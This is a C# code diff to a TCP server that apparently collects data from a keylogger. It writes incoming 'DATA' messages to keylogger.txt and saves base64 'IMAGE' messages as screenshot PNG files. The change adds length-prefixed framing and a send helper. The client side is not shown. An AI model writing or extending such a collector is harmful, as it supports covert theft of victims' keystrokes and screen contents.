@@ -25,14 +25,14 @@ namespace Server
             TcpListener server = null;
             try
             {
-                int packetSize = 256;
                 Int32 port = 40;
                 server = new TcpListener(IPAddress.Any, port);
 
                 server.Start();
 
-                Byte[] bytes = new Byte[packetSize];
-                String data = null;
+
+                byte[] datalength = new byte[4];
+                String decodedData = null;
 
                 Console.Write("Waiting for a connection... ");
                 TcpClient client = server.AcceptTcpClient();
@@ -44,24 +44,34 @@ namespace Server
 
 
                 int i;
-                while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
+                while ((i = stream.Read(datalength, 0, 4)) != 0)
                 {
-                    data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
-                    Console.WriteLine("Received: {0}", data);
 
-                    if (data.ToUpper().StartsWith("DATA"))
+                    int dataLength = BitConverter.ToInt32(datalength, 0);
+                    byte[] data = new byte[dataLength];
+                    Console.WriteLine(dataLength);
+
+                    int bytesReceived = 0;
+                    while (bytesReceived < data.Length)
                     {
-                        StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "/data.txt", true);
-                        file.Write(data.Remove(0, "DATA".Length));
-                        file.Close();
-                        Console.WriteLine("Sent: {0}", "TextFile");
+                        bytesReceived += stream.Read(data, bytesReceived, data.Length - bytesReceived);
                     }
-                    else if (data.ToUpper().StartsWith("IMAGE"))
+
+                    decodedData = System.Text.Encoding.ASCII.GetString(data, 0, dataLength);
+                    Console.WriteLine("Received: {0}", decodedData);
+
+                    if (decodedData.ToUpper().StartsWith("DATA"))
+                    {
+                        StreamWriter file = new StreamWriter(Directory.GetCurrentDirectory() + "/keylogger.txt", true);
+                        file.Write(decodedData.Remove(0, "DATA".Length));
+                        file.Close();                        
+                    }
+                    else if (decodedData.ToUpper().StartsWith("IMAGE"))
                     {
                         Console.WriteLine("Received: {0}", "screenshot");
-                        string strm = data.Remove(0, "IMAGE".Length);
+                        string strm = decodedData.Remove(0, "IMAGE".Length);
                         var myfilename = string.Format(@"{0}", Guid.NewGuid());
-                        string filepath = (Directory.GetCurrentDirectory() + myfilename + ".png");
+                        string filepath = (Directory.GetCurrentDirectory() + "/" + myfilename + ".png");
                         var bytess = Convert.FromBase64String(strm);
                         using (var imageFile = new FileStream(filepath, FileMode.Create))
                         {
@@ -70,9 +80,9 @@ namespace Server
                         }
                         Console.WriteLine("Received: {0}", "screenshot");
                     }
-                    else if (data.ToUpper().StartsWith("DISCONNECT"))
+                    else if (decodedData.ToUpper().StartsWith("DISCONNECT"))
                     {
-                        Console.WriteLine("Received: {0}", data);
+                        Console.WriteLine("Received: {0}", decodedData);
                         server.Stop();
                     }
                     Console.WriteLine("==");
@@ -124,6 +134,11 @@ namespace Server
             }
         }
 
-
+        void SendData(NetworkStream stream, byte[] data)
+        {
+            byte[] dataLength = BitConverter.GetBytes(data.Length);
+            stream.Write(dataLength, 0, dataLength.Length);
+            stream.Write(data, 0, data.Length);
+        }
     }
 }
